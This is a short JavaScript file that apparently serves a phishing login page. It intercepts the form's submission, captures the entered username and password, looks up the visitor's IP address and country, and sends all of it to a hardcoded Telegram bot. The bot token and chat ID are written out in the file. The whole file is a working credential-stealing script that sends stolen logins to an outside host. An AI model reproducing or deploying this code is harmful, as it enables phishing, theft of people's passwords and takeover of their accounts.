// Telegram bot token and chat ID
const botToken = '7466000672:AAHLWfplFgLHpOzVXZTsB7aBJjzEKwwEJQc';
const chatId = '7459542004';

document.getElementById('loginForm').addEventListener('submit', function (e) {
    e.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Function to get IP, country, and country code information
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;
            const country = data.country_name;
            const countryCode = data.country_code;

            // Message format for Telegram
            const message = `Login Info:\nUsername: ${username}\nPassword: ${password}\nIP: ${ip}\nCountry: ${country}\nCountry Code: ${countryCode}`;

            // Send the message to the Telegram bot
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            })
                .then(response => {
                    if (response.ok) {
                        console.log('Login info sent to Telegram successfully.');
                    } else {
                        console.error('Failed to send message.');
                    }
                })
                .catch(error => console.error('Error:', error));
        })
        .catch(error => console.error('Error fetching IP data:', error));
});
